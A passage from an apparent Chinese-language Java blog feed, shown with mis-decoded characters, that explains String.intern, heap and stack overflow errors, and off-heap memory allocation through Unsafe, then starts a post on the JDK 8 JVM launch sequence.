class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab&quot;</span>)+<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab&quot;</span>)+<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(str1.intern() == str2.intern());</span><br><span class="line">    System.out.println(str1.equals(str2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pb01.s3.bitiful.net/104.png" alt="avatar"></p><p>æ‰€ä»¥ä¸Šè¿°ç»“æœä¸­å¾—åˆ°çš„ä¾ç„¶æ˜¯ä¸¤ä¸ª<code>true</code>ã€‚åœ¨JDK1.7ä¹‹åï¼Œç¨å¾®æœ‰ä¸€äº›åŒºåˆ«ï¼Œåœ¨è°ƒç”¨<code>intern()</code>æ–¹æ³•æ—¶ï¼Œå½“å¸¸é‡æ± ä¸­æ²¡æœ‰å¯¹åº”çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¸ä¼šå†è¿›è¡Œå¤åˆ¶æ“ä½œï¼Œè€Œæ˜¯å°†å…¶ç›´æ¥ä¿®æ”¹ä¸ºæŒ‡å‘å½“å‰å­—ç¬¦ä¸²å †ä¸­çš„çš„å¼•ç”¨ï¼š</p><p><img src="https://pb01.s3.bitiful.net/105.png" alt="avatar"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="comment">//ä¸èƒ½ç›´æ¥å†™&quot;abc&quot;ï¼ŒåŒå¼•å·çš„å½¢å¼ï¼Œå†™äº†å°±ç›´æ¥åœ¨å¸¸é‡æ± é‡Œé¢å§abcåˆ›å¥½äº†</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab&quot;</span>)+<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">    System.out.println(str1.intern() == str1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åæˆ‘ä»¬ä¼šå‘ç°ï¼Œ<code>str1.intern()</code>å’Œ<code>str1</code>éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œç»“æœä¸º<code>true</code>ã€‚</p><p>æœ€åæˆ‘ä»¬å†æ¥è¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå„ä¸ªå†…å­˜åŒºåŸŸçš„ç”¨é€”ï¼š</p><ul><li>ï¼ˆçº¿ç¨‹ç‹¬æœ‰ï¼‰ç¨‹åºè®¡æ•°å™¨ï¼šä¿å­˜å½“å‰ç¨‹åºçš„æ‰§è¡Œä½ç½®ã€‚</li><li>ï¼ˆçº¿ç¨‹ç‹¬æœ‰ï¼‰è™šæ‹Ÿæœºæ ˆï¼šé€šè¿‡æ ˆå¸§æ¥ç»´æŒæ–¹æ³•è°ƒç”¨é¡ºåºï¼Œå¸®åŠ©æ§åˆ¶ç¨‹åºæœ‰åºè¿è¡Œã€‚</li><li>ï¼ˆçº¿ç¨‹ç‹¬æœ‰ï¼‰æœ¬åœ°æ–¹æ³•æ ˆï¼šåŒä¸Šï¼Œä½œç”¨ä¸æœ¬åœ°æ–¹æ³•ã€‚</li><li>å †ï¼šå‡ ä¹æ‰€æœ‰çš„å¯¹è±¡å’Œæ•°ç»„éƒ½åœ¨è¿™é‡Œä¿å­˜,å­—ç¬¦ä¸²å¸¸é‡æ± ã€‚</li><li>æ–¹æ³•åŒºï¼šç±»ä¿¡æ¯ã€å³æ—¶ç¼–è¯‘å™¨çš„ä»£ç ç¼“å­˜ã€è¿è¡Œæ—¶å¸¸é‡æ± ã€‚</li></ul><h3 id="çˆ†å†…å­˜å’Œçˆ†æ ˆ"><a href="#çˆ†å†…å­˜å’Œçˆ†æ ˆ" class="headerlink" title="çˆ†å†…å­˜å’Œçˆ†æ ˆ"></a>çˆ†å†…å­˜å’Œçˆ†æ ˆ</h3><p>å®é™…ä¸Šï¼Œåœ¨Javaç¨‹åºè¿è¡Œæ—¶ï¼Œå†…å­˜å®¹é‡ä¸å¯èƒ½æ˜¯æ— é™åˆ¶çš„ï¼Œå½“æˆ‘ä»¬çš„å¯¹è±¡åˆ›å»ºè¿‡å¤šæˆ–æ˜¯æ•°ç»„å®¹é‡è¿‡å¤§æ—¶ï¼Œå°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„å †å†…å­˜ä¸è¶³ä»¥å­˜æ”¾æ›´å¤šæ–°çš„å¯¹è±¡æˆ–æ˜¯æ•°ç»„ï¼Œè¿™æ—¶å°±ä¼šå‡ºç°é”™è¯¯ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[Integer.MAX_VALUE];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç”³è¯·äº†ä¸€ä¸ªå®¹é‡ä¸º21äº¿å¤šçš„intå‹æ•°ç»„ï¼Œæ˜¾ç„¶ï¼Œå¦‚æ­¤ä¹‹å¤§çš„æ•°ç»„ä¸å¯èƒ½æ”¾åœ¨æˆ‘ä»¬çš„å †å†…å­˜ä¸­ï¼Œæ‰€ä»¥ç¨‹åºè¿è¡Œæ—¶å°±ä¼šè¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.OutOfMemoryError: Requested array size exceeds VM limit</span><br><span class="line">at com.test.Main.main(Main.java:<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾—åˆ°äº†ä¸€ä¸ª<code>OutOfMemoryError</code>é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„å†…å­˜æº¢å‡ºé”™è¯¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‚æ•°æ¥æ§åˆ¶å †å†…å­˜çš„æœ€å¤§å€¼å’Œæœ€å°å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xmsæœ€å°å€¼ -Xmxæœ€å¤§å€¼</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬ç°åœ¨é™åˆ¶å †å†…å­˜ä¸ºå›ºå®šå€¼1Må¤§å°ï¼Œå¹¶ä¸”åœ¨æŠ›å‡ºå†…å­˜æº¢å‡ºå¼‚å¸¸æ—¶ä¿å­˜å½“å‰çš„å†…å­˜å †è½¬å‚¨å¿«ç…§ï¼š</p><p><img src="https://pb01.s3.bitiful.net/106.png" alt="avatar"></p><p>æ³¨æ„å †å†…å­˜ä¸è¦è®¾ç½®å¤ªå°ï¼Œä¸ç„¶è¿è™šæ‹Ÿæœºéƒ½ä¸è¶³ä»¥å¯åŠ¨ï¼Œæ¥ç€æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªä¸€å®šä¼šå¯¼è‡´å†…å­˜æº¢å‡ºçš„ç¨‹åºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Test&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">Test</span>());    <span class="comment">//æ— é™åˆ›å»ºTestå¯¹è±¡å¹¶ä¸¢è¿›Listä¸­</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¨‹åºè¿è¡Œä¹‹åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.lang.OutOfMemoryError: Java heap space</span><br><span class="line">Dumping heap to java_pid35172.hprof ...</span><br><span class="line">Heap dump file created [12895344 bytes in 0.028 secs]</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space</span><br><span class="line">at java.util.Arrays.copyOf(Arrays.java:3210)</span><br><span class="line">at java.util.Arrays.copyOf(Arrays.java:3181)</span><br><span class="line">at java.util.ArrayList.grow(ArrayList.java:267)</span><br><span class="line">at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:241)</span><br><span class="line">at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:233)</span><br><span class="line">at java.util.ArrayList.add(ArrayList.java:464)</span><br><span class="line">at com.test.Main.main(Main.java:10)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é”™è¯¯å‡ºç°åŸå› æ­£æ˜¯<code>Java heap space</code>ï¼Œä¹Ÿå°±æ˜¯å †å†…å­˜æ»¡äº†ï¼Œå¹¶ä¸”æ ¹æ®æˆ‘ä»¬è®¾å®šçš„VMå‚æ•°ï¼Œå †å†…å­˜ä¿å­˜äº†å¿«ç…§ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥åœ¨IDEAå†…ç½®çš„Profilerä¸­è¿›è¡ŒæŸ¥çœ‹ï¼š</p><p><img src="https://pb01.s3.bitiful.net/107.png" alt="avatar"></p><p>å¯ä»¥å¾ˆæ˜æ˜¾åœ°çœ‹åˆ°ï¼Œåœ¨åˆ›å»ºäº†360146ä¸ªTestå¯¹è±¡ä¹‹åï¼Œå †å†…å­˜ä¸å¤Ÿäº†ï¼Œäºæ˜¯å°±æŠ›å‡ºäº†å†…å­˜æº¢å‡ºé”™è¯¯ã€‚</p><p>æˆ‘ä»¬æ¥ç€æ¥çœ‹æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè™šæ‹Ÿæœºæ ˆä¼šåœ¨æ–¹æ³•è°ƒç”¨æ—¶æ’å…¥æ ˆå¸§ï¼Œé‚£ä¹ˆï¼Œè®¾æƒ³å¦‚æœå‡ºç°æ— é™é€’å½’çš„æƒ…å†µå‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªæ°¸æ— ä¼‘æ­¢çš„ç¨‹åºï¼Œå¹¶ä¸”ä¼šä¸æ–­ç»§ç»­å‘ä¸‹è°ƒç”¨testæ–¹æ³•æœ¬èº«ï¼Œé‚£ä¹ˆæŒ‰ç…§æˆ‘ä»¬ä¹‹å‰çš„é€»è¾‘æ¨å¯¼ï¼Œæ— é™åœ°æ’å…¥æ ˆå¸§é‚£ä¹ˆä¸€å®šä¼šå°†è™šæ‹Ÿæœºæ ˆå¡æ»¡ï¼Œæ‰€ä»¥ï¼Œå½“æ ˆçš„æ·±åº¦å·²ç»ä¸è¶³ä»¥ç»§ç»­æ’å…¥æ ˆå¸§æ—¶ï¼Œå°±ä¼šè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.StackOverflowError</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">at com.test.Main.test(Main.java:12)</span><br><span class="line">....ä»¥ä¸‹çœç•¥å¾ˆå¤šè¡Œ</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„æ ˆæº¢å‡ºï¼Œå®ƒå’Œå †æº¢å‡ºæ¯”è¾ƒç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±äºå®¹çº³ä¸ä¸‹æ‰å¯¼è‡´çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>-Xss</code>æ¥è®¾å®šæ ˆå®¹é‡ã€‚</p><h3 id="ç”³è¯·å †å¤–å†…å­˜"><a href="#ç”³è¯·å †å¤–å†…å­˜" class="headerlink" title="ç”³è¯·å †å¤–å†…å­˜"></a>ç”³è¯·å †å¤–å†…å­˜</h3><p>é™¤äº†å †å†…å­˜å¯ä»¥å­˜æ”¾å¯¹è±¡æ•°æ®ä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”³è¯·å †å¤–å†…å­˜ï¼ˆç›´æ¥å†…å­˜ï¼‰ï¼Œä¹Ÿå°±æ˜¯ä¸å—JVMç®¡æ§çš„å†…å­˜åŒºåŸŸï¼Œè¿™éƒ¨åˆ†åŒºåŸŸçš„å†…å­˜éœ€è¦æˆ‘ä»¬è‡ªè¡Œå»ç”³è¯·å’Œé‡Šæ”¾ï¼Œå®é™…ä¸Šæœ¬è´¨å°±æ˜¯JVMé€šè¿‡C/C++è°ƒç”¨<code>malloc</code>å‡½æ•°ç”³è¯·çš„å†…å­˜ï¼Œå½“ç„¶å¾—æˆ‘ä»¬è‡ªå·±å»é‡Šæ”¾äº†ã€‚ä¸è¿‡è™½ç„¶æ˜¯ç›´æ¥å†…å­˜ï¼Œä¸ä¼šå—åˆ°å †å†…å­˜å®¹é‡é™åˆ¶ï¼Œä½†æ˜¯ä¾ç„¶ä¼šå—åˆ°æœ¬æœºæœ€å¤§å†…å­˜çš„é™åˆ¶ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰å¯èƒ½æŠ›å‡º<code>OutOfMemoryError</code>å¼‚å¸¸ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æåˆ°ä¸€ä¸ªå †å¤–å†…å­˜æ“ä½œç±»ï¼š<code>Unsafe</code>ï¼Œå°±åƒå®ƒçš„åå­—ä¸€æ ·ï¼Œè™½ç„¶Javaæä¾›å †å¤–å†…å­˜çš„æ“ä½œç±»ï¼Œä½†æ˜¯å®é™…ä¸Šå®ƒæ˜¯ä¸å®‰å…¨çš„ï¼Œåªæœ‰ä½ å®Œå…¨äº†è§£åº•å±‚åŸç†å¹¶ä¸”èƒ½å¤Ÿåˆç†æ§åˆ¶å †å¤–å†…å­˜ï¼Œæ‰èƒ½å®‰å…¨åœ°ä½¿ç”¨å †å¤–å†…å­˜ã€‚</p><p>æ³¨æ„è¿™ä¸ªç±»ä¸è®©æˆ‘ä»¬newï¼Œä¹Ÿæ²¡æœ‰ç›´æ¥è·å–æ–¹å¼ï¼ˆå‹æ ¹å°±æ²¡æƒ³è®©æˆ‘ä»¬ç”¨ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Unsafe</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">registerNatives</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">        sun.reflect.Reflection.registerMethodsToFilter(Unsafe.class, <span class="string">&quot;getUnsafe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Unsafe</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Unsafe</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">if</span> (!VM.isSystemDomainLoader(caller.getClassLoader()))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe&quot;</span>);   <span class="comment">//ä¸æ˜¯JDKçš„ç±»ï¼Œä¸è®©ç”¨ã€‚</span></span><br><span class="line">        <span class="keyword">return</span> theUnsafe;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°±é€šè¿‡åå°„ç»™ä»–æå‡ºæ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredFields()[<span class="number">0</span>];</span><br><span class="line">    unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°Unsafeç±»ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç”³è¯·å †å¤–å†…å­˜äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬ç°åœ¨æƒ³è¦ç”³è¯·ä¸€ä¸ªintå¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¹¶åœ¨æ­¤ç©ºé—´ä¸­å­˜æ”¾ä¸€ä¸ªintç±»å‹çš„æ•°æ®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredFields()[<span class="number">0</span>];</span><br><span class="line">    unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”³è¯·4å­—èŠ‚å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å¾—åˆ°å¯¹åº”ä½ç½®çš„åœ°å€</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">address</span> <span class="operator">=</span> unsafe.allocateMemory(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//åœ¨å¯¹åº”çš„åœ°å€ä¸Šè®¾å®šintçš„å€¼</span></span><br><span class="line">    unsafe.putInt(address, <span class="number">6666666</span>);</span><br><span class="line">    <span class="comment">//è·å–å¯¹åº”åœ°å€ä¸Šçš„Intå‹æ•°å€¼</span></span><br><span class="line">    System.out.println(unsafe.getInt(address));</span><br><span class="line">    <span class="comment">//é‡Šæ”¾ç”³è¯·åˆ°çš„å†…å®¹</span></span><br><span class="line">    unsafe.freeMemory(address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”±äºå†…å­˜å·²ç»é‡Šæ”¾ï¼Œè¿™æ—¶æ•°æ®å°±æ²¡äº†</span></span><br><span class="line">    System.out.println(unsafe.getInt(address));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸‹<code>allocateMemory</code>åº•å±‚æ˜¯å¦‚ä½•è°ƒç”¨çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹C++æºç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNSAFE_ENTRY</span>(jlong, <span class="built_in">Unsafe_AllocateMemory0</span>(JNIEnv *env, jobject unsafe, jlong size)) &#123;</span><br><span class="line">  <span class="type">size_t</span> sz = (<span class="type">size_t</span>)size;</span><br><span class="line"></span><br><span class="line">  sz = <span class="built_in">align_up</span>(sz, HeapWordSize);</span><br><span class="line">  <span class="type">void</span>* x = os::<span class="built_in">malloc</span>(sz, mtOther);   <span class="comment">//è¿™é‡Œè°ƒç”¨äº†os::mallocæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">addr_to_java</span>(x);</span><br><span class="line">&#125; UNSAFE_END</span><br></pre></td></tr></table></figure><p>æ¥ç€æ¥çœ‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">os::malloc</span><span class="params">(<span class="type">size_t</span> size, MEMFLAGS flags)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> os::<span class="built_in">malloc</span>(size, flags, CALLER_PC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">os::malloc</span><span class="params">(<span class="type">size_t</span> size, MEMFLAGS memflags, <span class="type">const</span> NativeCallStack&amp; stack)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  u_char* ptr;</span><br><span class="line">  ptr = (u_char*)::<span class="built_in">malloc</span>(alloc_size);   <span class="comment">//è°ƒç”¨C++æ ‡å‡†åº“å‡½æ•° malloc(size)</span></span><br><span class="line">....</span><br><span class="line">  <span class="comment">// we do not track guard memory</span></span><br><span class="line">  <span class="keyword">return</span> MemTracker::<span class="built_in">record_malloc</span>((address)ptr, size, memflags, stack, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸Šé¢çš„Javaä»£ç è½¬æ¢ä¸ºCä»£ç ï¼Œå·®ä¸å¤šå°±æ˜¯è¿™ä¸ªæ„æ€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> * a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *a = <span class="number">6666666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¯´ï¼Œç›´æ¥å†…å­˜å®é™…ä¸Šå°±æ˜¯JVMç”³è¯·çš„ä¸€å—é¢å¤–çš„å†…å­˜ç©ºé—´ï¼Œä½†æ˜¯å®ƒå¹¶ä¸åœ¨å—ç®¡æ§çš„å‡ ç§å†…å­˜ç©ºé—´ä¸­ï¼Œå½“ç„¶è¿™äº›å†…å­˜ä¾ç„¶å±äºæ˜¯JVMçš„ï¼Œç”±äºJVMæä¾›çš„å †å†…å­˜ä¼šè¿›è¡Œåƒåœ¾å›æ”¶ç­‰å·¥ä½œï¼Œæ•ˆç‡ä¸å¦‚ç›´æ¥ç”³è¯·å’Œæ“ä½œå†…å­˜æ¥å¾—å¿«ï¼Œä¸€äº›æ¯”è¾ƒè¿½æ±‚æè‡´æ€§èƒ½çš„æ¡†æ¶ä¼šç”¨åˆ°å †å¤–å†…å­˜æ¥æå‡è¿è¡Œé€Ÿåº¦ï¼Œå¦‚nioæ¡†æ¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVMå¯åŠ¨æµç¨‹(JDK8)</title>
      <link href="/2023/12/17/JVM%E5%90%AF%E5%8A%A8/"/>
      <url>/2023/12/17/JVM%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="JVMå¯åŠ¨æµç¨‹-JDK8"><a href="#JVMå¯åŠ¨æµç¨‹-JDK8" class="headerlink" title="JVMå¯åŠ¨æµç¨‹(JDK8)"></a>JVMå¯åŠ¨æµç¨‹(JDK8)</h2><p>JVMçš„å¯åŠ¨å…¥å£æ˜¯ä½äºjdk/src/share/bin/java.cçš„JLI_Launchå‡½æ•°,å…¶å®šä¹‰å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">JLI_Launch</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv,              <span class="comment">/* main argc, argc */</span></span></span><br><span 